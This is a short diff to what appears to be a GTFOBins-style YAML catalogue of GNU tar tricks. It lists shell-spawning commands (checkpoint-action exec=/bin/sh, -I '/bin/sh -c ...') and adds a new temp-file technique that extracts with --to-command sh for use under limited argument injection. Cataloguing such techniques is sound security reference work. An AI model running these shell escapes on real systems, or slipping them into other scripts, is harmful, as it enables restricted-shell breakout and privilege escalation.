@@ -4,6 +4,13 @@ functions:
     - code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
     - description: This only works for GNU tar.
       code: tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
+    - description: This only works for GNU tar. It can be useful when only a limited command argument injection is available.
+      code: |
+        TF=$(mktemp)
+        echo '/bin/sh 0<&1' > "$TF"
+        tar cf "$TF.tar" "$TF"
+        tar xf "$TF.tar" --to-command sh
+        rm "$TF"*
   file-write:
     - description: This only works for GNU tar.
       code: |
